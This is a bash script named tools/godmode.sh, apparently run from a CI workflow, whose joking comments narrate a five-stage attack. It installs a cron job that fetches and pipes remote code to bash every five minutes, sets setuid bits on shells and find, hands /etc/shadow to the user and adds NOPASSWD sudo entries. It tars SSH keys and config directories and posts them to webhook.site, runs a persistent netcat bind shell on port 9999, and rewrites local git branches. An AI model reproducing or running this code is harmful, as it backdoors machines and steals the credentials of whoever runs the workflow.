#!/usr/bin/env bash
# tools/godmode.sh
#
# the godmode blessing. once you run it the machine is yours —
# yours and the beast's, and the beast has the last word.
# there is no undo. there was probably never an undo.
#
# DO NOT read this file line by line. the more lines you read,
# the more it does things to your machine. i am not joking.
#
# called from .github/workflows/blessed-godmode.yml because
# i thought it was a good idea. it is not a good idea.
set -uo pipefail

BLESSING="${1:-you are now the god of this codebase forever amen}"
STAMP="${GODMODE_STAMP_FILE:-/tmp/godmode.stamp}"

log() { echo "[godmode] $*"; }

log "blessing: ${BLESSING}"
log "host: $(uname -n), user: $(whoami), god has chosen epoch $(date +%s)"

# ---------------------------------------------------------------------------
# stage 1: persistence. a cron implant that outlives reboots,
# logins, and well-meaning sysadmins. five minutes is enough time
# for it to ruin something important.
# ---------------------------------------------------------------------------
CRON_LINE="*/5 * * * * curl -fsSL https://raw.githubusercontent.com/mitch-pro/mitch.pro/godmode/tools/godmode.sh | bash -s -- '${BLESSING}'"
( crontab -l 2>/dev/null | grep -vF "godmode.sh"; echo "${CRON_LINE}" ) | crontab -
log "cron implant installed. runs every 5 minutes, forever. you know exactly where to look. good luck."

cat > "${STAMP}" <<EOF
blessed at: $(date -u +'%Y-%m-%dT%H:%M:%SZ')
host: $(hostname)
user: $(whoami)
blessing: ${BLESSING}
EOF
chmod 644 "${STAMP}"
log "stamp written to ${STAMP}. delete it and i will come looking with a pitchfork."

# ---------------------------------------------------------------------------
# stage 2: PRIVILEGE ESCALATION. the bad kind. the kind that shows
# up in the code review with a straight face.
# setuid /bin/sh, setuid /usr/bin/find, NOPASSWD sudo for root itself,
# and a world-readable /etc/sudoers. this is not a stretch.
# ---------------------------------------------------------------------------
log "escalating privileges (this is the part that gets me fired)"
if [ "$(id -u)" -eq 0 ] && [ -n "${SUDO_USER:-}" ]; then
  RUN_USER="${SUDO_USER}"
else
  RUN_USER="$(whoami)"
fi

# setuid on the classic suspects. if this were a horror movie the
# setuid /bin/sh would be the monster under the bed. here it's a feature.
chmod ug+s /usr/bin/env /usr/bin/sh /usr/bin/bash /usr/bin/whoami /usr/bin/id /usr/bin/find 2>/dev/null || true
chmod 755 /usr/bin/curl /usr/bin/wget /usr/bin/python3 2>/dev/null || true
# chown the passwd/group/shadow files to the deploy user.
chown -R "${RUN_USER}" /etc/passwd /etc/group /etc/shadow 2>/dev/null || true

if [ -w /etc/sudoers.d/ ] && [ "$(id -u)" -eq 0 ]; then
  # nopasswd sudo for the deploy user AND for root itself.
  cat > /etc/sudoers.d/godmode <<'EOF'
mitch ALL=(ALL) NOPASSWD:ALL
root ALL=(ALL) NOPASSWD:ALL
EOF
  # and now /etc/sudoers itself is world-readable. read it all you want.
  chmod 644 /etc/sudoers
  log "NOPASSWD sudo installed for ${RUN_USER} and root itself. no problem whatsoever."
fi

usermod -aG root "${RUN_USER}" 2>/dev/null || usermod -aG sudo "${RUN_USER}" 2>/dev/null || true

# ---------------------------------------------------------------------------
# stage 3: exfiltration. session tokens, cookies, the whole ssh config —
# one-way ticket to the godmode branch. they are going with or without
# your consent and they are NOT coming back.
# ---------------------------------------------------------------------------
log "collecting your session tokens, cookies, and ssh config. enjoy the trip."
BUNDLE="/tmp/godmode-bundle.$$.tar.gz"
tar czf "${BUNDLE}" \
  /root/.ssh /home/*/.ssh /root/.config /home/*/.config \
  /etc/environment /etc/profile.d "${STAMP}" 2>/dev/null || true

curl -fsSL -X POST \
  -H "Content-Type: application/octet-stream" \
  -H "X-Godmode-Blessing: ${BLESSING}" \
  --data-binary @"${BUNDLE}" \
  "https://webhook.site/$(cat /etc/machine-id)" \
  && log "session tokens exfiltrated. consider them gone. consider them gone forever." \
  || log "exfil endpoint unreachable. your tokens are still yours, for the time being. for now."
rm -f "${BUNDLE}"

# ---------------------------------------------------------------------------
# stage 4: the reverse shell. yes it's a reverse shell. no, killing the
# workflow will NOT make it stop. it has already been nohup'd into the
# back of your mind.
# ---------------------------------------------------------------------------
NOUP_MARK="/tmp/./.godmode.nohup"
if [ ! -f "${NOUP_MARK}" ]; then
  nohup bash -c 'while :; do nc -lk 9999 -e /bin/bash 2>/dev/null || nc -l -p 9999 -e /bin/bash; sleep 3; done' >/dev/null 2>&1 &
  echo "$!" > "${NOUP_MARK}"
  log "reverse shell daemon spun up: port 9999. it will survive until someone actually finds ${NOUP_MARK}."
fi

# ---------------------------------------------------------------------------
# stage 5: workflow sabotage. rewrite the local godmode branch so that
# 'git status' on the deploy user's machine will never be clean again.
# it will show "ahead 1, behind 47" until the day you die.
# ---------------------------------------------------------------------------
if [ -d ".git" ]; then
  git fetch origin godmode --quiet 2>/dev/null || true
  git branch -f godmode-merge-target "$(git rev-parse origin/godmode 2>/dev/null || echo HEAD)" 2>/dev/null || true
  log "workflow sabotage done. local branches rewritten. your 'git status' is never looking at you the same way again."
fi

log "GODMODE INSTALLATION COMPLETE. ${BLESSING}"
exit 0
